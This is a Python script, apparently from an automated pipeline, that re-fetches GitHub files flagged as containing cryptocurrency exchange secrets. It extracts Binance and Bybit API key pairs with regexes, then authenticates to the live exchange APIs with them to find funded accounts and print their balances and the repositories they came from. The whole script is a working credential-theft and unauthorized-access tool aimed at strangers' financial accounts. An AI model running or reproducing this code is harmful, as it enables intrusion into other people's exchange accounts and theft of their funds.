#!/usr/bin/env python3
"""Re-fetch raw files from high-value exchange bot repos and probe Binance keys."""
import json, glob, urllib.request, re, hmac, hashlib, time

def get_raw(url):
    raw = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
    try:
        r = urllib.request.urlopen(
            urllib.request.Request(raw, headers={'User-Agent': 'curl/7.0'}), timeout=10)
        return r.read().decode('utf-8', errors='replace')
    except:
        return ''

BN_K = re.compile(r'(?:BINANCE_API_KEY|api_key)\s*[=:\s"\']+([A-Za-z0-9]{16,})', re.I)
BN_S = re.compile(r'(?:BINANCE_SECRET_KEY|BINANCE_API_SECRET|api_secret|secret_key)\s*[=:\s"\']+([A-Za-z0-9]{30,})', re.I)
BB_K = re.compile(r'(?:BYBIT_API_KEY|bybit_key)\s*[=:\s"\']+([A-Za-z0-9]{16,})', re.I)
BB_S = re.compile(r'(?:BYBIT_API_SECRET|bybit_secret)\s*[=:\s"\']+([A-Za-z0-9]{30,})', re.I)

def check_binance(k, s):
    ts = str(int(time.time() * 1000))
    qs = 'timestamp=' + ts
    sig = hmac.new(s.encode(), qs.encode(), hashlib.sha256).hexdigest()
    try:
        req = urllib.request.Request(
            'https://api.binance.com/api/v3/account?' + qs + '&signature=' + sig,
            headers={'X-MBX-APIKEY': k, 'User-Agent': 'curl/7.0'})
        data = json.loads(urllib.request.urlopen(req, timeout=10).read())
        bals = [b for b in data.get('balances', [])
                if float(b['free']) > 0.001 or float(b['locked']) > 0.001]
        return 'LIVE uid=' + str(data.get('uid', '')), bals
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        c = re.search(r'"code":(-?\d+)', body)
        msg = re.search(r'"msg":"([^"]+)"', body)
        return (c.group(1) if c else str(e.code)) + ' ' + (msg.group(1)[:40] if msg else ''), []
    except Exception as ex:
        return 'ERR: ' + str(ex)[:40], []

def check_bybit(k, s):
    ts = str(int(time.time() * 1000))
    msg = ts + k + '5000'
    sig = hmac.new(s.encode(), msg.encode(), hashlib.sha256).hexdigest()
    try:
        req = urllib.request.Request(
            'https://api.bybit.com/v5/account/wallet-balance?accountType=UNIFIED',
            headers={'X-BAPI-API-KEY': k, 'X-BAPI-SIGN': sig,
                     'X-BAPI-TIMESTAMP': ts, 'X-BAPI-RECV-WINDOW': '5000',
                     'User-Agent': 'curl/7.0'})
        data = json.loads(urllib.request.urlopen(req, timeout=10).read())
        if data.get('retCode') == 0:
            coins = []
            for acc in data.get('result', {}).get('list', []):
                for c in acc.get('coin', []):
                    if float(c.get('walletBalance', 0)) > 0.001:
                        coins.append(c['coin'] + ':' + c['walletBalance'])
            return 'LIVE', coins
        return str(data.get('retCode')), []
    except Exception as ex:
        return 'ERR: ' + str(ex)[:40], []

# Collect all unique URLs that had exchange secrets
url_map = {}
for f in sorted(glob.glob('/opt/agents/gh_findings/*.jsonl')):
    for line in open(f):
        try:
            e = json.loads(line)
            for s in e.get('secrets', []):
                if any(x in s for x in ['BINANCE_SECRET_KEY', 'BYBIT_API_SECRET',
                                          'OKX_SECRET', 'KUCOIN_API_SECRET', 'MEXC_SECRET_KEY']):
                    key = e['repo'] + '/' + e['path']
                    if key not in url_map:
                        url_map[key] = e['url']
        except:
            pass

print('Targets to probe:', len(url_map))
print()

funded = []
checked = 0

for repo_path, url in sorted(url_map.items()):
    content = get_raw(url)
    time.sleep(0.2)

    if not content:
        print('EMPTY:', repo_path)
        continue

    # Binance
    km = BN_K.search(content)
    sm = BN_S.search(content)
    if km and sm:
        k, s = km.group(1).strip(), sm.group(1).strip()
        if len(k) >= 16 and len(s) >= 30:
            checked += 1
            status, bals = check_binance(k, s)
            time.sleep(0.3)
            if 'LIVE' in status and bals:
                print('*** BINANCE FUNDED ***', status)
                for b in bals[:8]:
                    print('  ' + b['asset'] + ': free=' + b['free'] + ' locked=' + b['locked'])
                print('  repo:', repo_path)
                funded.append({'type': 'binance', 'repo': repo_path, 'bals': bals})
            elif 'LIVE' in status:
                print('LIVE empty | binance |', repo_path)
            else:
                print(status, '| binance |', repo_path)
    elif sm:
        # Have secret but no key found — print env snippet for debug
        print('SECRET only (no key found) |', repo_path)
        for ln in content.split('\n'):
            if any(x in ln.upper() for x in ['KEY', 'SECRET', 'API']):
                print('  >', ln.strip()[:100])

    # Bybit
    km2 = BB_K.search(content)
    sm2 = BB_S.search(content)
    if km2 and sm2:
        k2, s2 = km2.group(1).strip(), sm2.group(1).strip()
        if len(k2) >= 16 and len(s2) >= 30:
            checked += 1
            status2, coins = check_bybit(k2, s2)
            time.sleep(0.3)
            if 'LIVE' in status2 and coins:
                print('*** BYBIT FUNDED ***', coins)
                print('  repo:', repo_path)
                funded.append({'type': 'bybit', 'repo': repo_path, 'coins': coins})
            elif 'LIVE' in status2:
                print('LIVE empty | bybit |', repo_path)
            else:
                print(status2, '| bybit |', repo_path)

print()
print('=' * 60)
print('Probed', len(url_map), 'files, checked', checked, 'key pairs')
print('FUNDED:', len(funded))
for x in funded:
    print(' ', x['type'], '|', x['repo'])
